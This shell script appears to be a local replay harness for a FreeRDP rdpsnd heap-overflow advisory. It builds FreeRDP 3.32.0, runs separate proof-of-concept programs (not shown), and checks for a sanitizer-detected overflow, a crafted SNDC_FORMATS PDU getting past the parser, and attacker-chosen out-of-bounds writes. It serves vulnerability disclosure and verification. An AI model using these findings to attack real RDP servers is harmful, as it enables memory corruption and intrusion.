#!/bin/sh
# Real-library replay for FreeRDP rdpsnd select_format() wraparound
# (GHSA-3m9q-g533-rqjq / CVE-2026-114045).
#
# Provisions FreeRDP 3.32.0 under $WORK (default /tmp/fr-wake2), builds the
# three libraries needed by the PoCs with gcc ASan/UBSan and again without
# sanitizers (the chosen-byte PoC must survive two OOB writes), compiles the
# PoCs and controls, and checks the observed output.
#
# IN-PROCESS: no virtual-channel transport, RDP session or auth gate. The
# PocRdpsndWire and PocRdpsndChosenBytes cases do drive the real
# rdpsnd_server_recv_formats() parser with a crafted SNDC_FORMATS PDU. Only
# loopback-local, source-built code is used; no external probes.
set -eu

HERE=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
WORK=${FREERDP_WORK:-/tmp/fr-wake2}
SRC=$WORK/src3320
BUILD=$WORK/build3320
PLAIN=$WORK/build3320_plain
TAG=3.32.0
CLONE_URL=${FREERDP_CLONE_URL:-https://github.com/FreeRDP/FreeRDP.git}
ASAN='detect_leaks=0:allocator_may_return_null=1:abort_on_error=0'
# Without these, CMake aborts on missing optional dependencies on a fresh host.
FEATURE_FLAGS="-DWITH_SERVER=ON -DWITH_CLIENT=OFF -DWITH_SERVER_CHANNELS=ON -DWITH_KRB5=OFF -DWITH_PKCS11=OFF -DWITH_SMARTCARD_EMULATE=OFF -DWITH_FFMPEG=OFF -DWITH_SWSCALE=OFF -DCHANNEL_URBDRC=OFF -DWITH_CUPS=OFF -DWITH_FUSE=OFF"

fail() { echo "FAIL: $*" >&2; exit 1; }

if [ ! -d "$SRC/.git" ]; then
    mkdir -p "$WORK"
    git clone --depth 1 --branch "$TAG" "$CLONE_URL" "$SRC"
fi

if [ ! -f "$BUILD/server/common/libfreerdp-server3.so" ]; then
    cmake -S "$SRC" -B "$BUILD" -GNinja \
        -DCMAKE_BUILD_TYPE=Debug \
        -DCMAKE_C_FLAGS='-fsanitize=address,undefined -fno-omit-frame-pointer -g -O1' \
        $FEATURE_FLAGS
    ninja -C "$BUILD" -j16 libwinpr3.so libfreerdp3.so libfreerdp-server3.so
fi

if [ ! -f "$PLAIN/server/common/libfreerdp-server3.so" ]; then
    cmake -S "$SRC" -B "$PLAIN" -GNinja -DCMAKE_BUILD_TYPE=Debug \
        -DCMAKE_C_FLAGS='' $FEATURE_FLAGS
    ninja -C "$PLAIN" -j16 libwinpr3.so libfreerdp3.so libfreerdp-server3.so
fi

compile() { # src out [builddir]
    BD=${3:-$BUILD}
    gcc -g -O1 -fno-omit-frame-pointer -fsanitize=address,undefined -std=gnu11 \
        -Wno-deprecated-declarations \
        -I"$SRC/winpr/include" -I"$BD/winpr/include" -I"$BD" \
        -I"$BD/include" -I"$SRC/include" -I"$SRC/channels/rdpsnd/server" \
        -I"$SRC/channels/rdpsnd/common" \
        "$1" -o "$2" \
        -L"$BD/libfreerdp" -L"$BD/winpr/libwinpr" -L"$BD/server/common" \
        -Wl,-rpath,"$BD/libfreerdp:$BD/winpr/libwinpr:$BD/server/common" \
        -lfreerdp3 -lwinpr3 -lfreerdp-server3 -lpthread -lm -ldl
}

compile_plain() { # src out
    gcc -g -O1 -fno-omit-frame-pointer -std=gnu11 -Wno-deprecated-declarations \
        -I"$SRC/winpr/include" -I"$PLAIN/winpr/include" -I"$PLAIN" \
        -I"$PLAIN/include" -I"$SRC/include" -I"$SRC/channels/rdpsnd/server" \
        -I"$SRC/channels/rdpsnd/common" \
        "$1" -o "$2" \
        -L"$PLAIN/libfreerdp" -L"$PLAIN/winpr/libwinpr" -L"$PLAIN/server/common" \
        -Wl,-rpath,"$PLAIN/libfreerdp:$PLAIN/winpr/libwinpr:$PLAIN/server/common" \
        -lfreerdp3 -lwinpr3 -lfreerdp-server3 -lpthread -lm -ldl
}

compile "$HERE/PocRdpsndOverflow.c" "$WORK/PocRdpsndOverflow" || fail 'PoC compile'
compile "$HERE/PocPcmControl.c" "$WORK/PocPcmControl" || fail 'control compile'

# Rung 1/3 on the real library.
ASAN_OPTIONS="$ASAN" timeout 60 "$WORK/PocRdpsndOverflow" > "$WORK/poc.out" 2>&1 || true
grep -q 'out_frames=0xfffffffffffffff0' "$WORK/poc.out" || fail 'wrapped out_frames missing'
grep -q 'realloc failed' "$WORK/poc.out" || fail 'failed realloc missing'
grep -q 'ERROR: AddressSanitizer: heap-buffer-overflow' "$WORK/poc.out" || fail 'no ASan heap overflow'
grep -q 'WRITE of size 16384' "$WORK/poc.out" || fail 'wrong write size'
grep -q '0 bytes after 8820-byte region' "$WORK/poc.out" || fail 'wrong region size'
grep -q 'rdpsnd_server_send_samples' "$WORK/poc.out" || fail 'wrong write frame'

# Benign control must stay clean.
ASAN_OPTIONS="$ASAN" timeout 60 "$WORK/PocPcmControl" > "$WORK/pcm.out" 2>&1
grep -q 'PCM control SendSamples done' "$WORK/pcm.out" || fail 'PCM control did not finish'
if grep -q 'AddressSanitizer' "$WORK/pcm.out"; then fail 'PCM control hit ASan'; fi

# Real SNDC_FORMATS parse path: the parser admits the malicious record.
compile "$HERE/PocRdpsndWire.c" "$WORK/PocRdpsndWire" || fail 'wire PoC compile'
ASAN_OPTIONS="$ASAN" timeout 60 "$WORK/PocRdpsndWire" > "$WORK/wire.out" 2>&1 || true
grep -q 'recv_formats rc=0 nformats=2' "$WORK/wire.out" || fail 'wire parse rejected the PDUs'
grep -q 'parsed\[1\]: tag=17 channels=2 blockalign=4 cbsize=2' "$WORK/wire.out" || fail 'parsed record mismatch'
grep -q 'out_frames=0xfffffffffffffff0' "$WORK/wire.out" || fail 'wire path did not wrap'
grep -q 'ERROR: AddressSanitizer: heap-buffer-overflow' "$WORK/wire.out" || fail 'wire path no ASan overflow'

# Rung 4 on real bytes through the real SNDC_FORMATS parser. This PoC is not
# ASan-instrumented: ASan aborts on the first OOB write, before the second call.
# It places client-chosen 0xDE / 0xAD at OOB offsets 8820 / 21384.
compile_plain "$HERE/PocRdpsndChosenBytes.c" \
    "$WORK/PocRdpsndChosenBytes" || fail 'chosen-byte PoC compile'
timeout 60 "$WORK/PocRdpsndChosenBytes" > "$WORK/chosen.out" 2>&1 || \
    fail 'chosen-byte PoC failed'
grep -q 'recv_formats rc=0 nformats=2' "$WORK/chosen.out" || \
    fail 'chosen-byte PoC: wire parse'
grep -q 'out_frames=0xfffffffffffffff0 out_buffer_size=8820' "$WORK/chosen.out" || \
    fail 'chosen-byte PoC: wrap'
grep -q 'readback offset 8820  = de' "$WORK/chosen.out" || \
    fail 'chosen-byte PoC: marker 1'
grep -q 'readback offset 21384 = ad' "$WORK/chosen.out" || \
    fail 'chosen-byte PoC: marker 2'
grep -q '\[rung4\] RESULT=PASS' "$WORK/chosen.out" || fail 'chosen-byte PoC: result'

echo 'ALL REAL-LIBRARY CHECKS PASS'
echo "vulnerable: $WORK/poc.out"
echo "control:    $WORK/pcm.out"
echo "wire:       $WORK/wire.out"
echo "chosen:     $WORK/chosen.out"
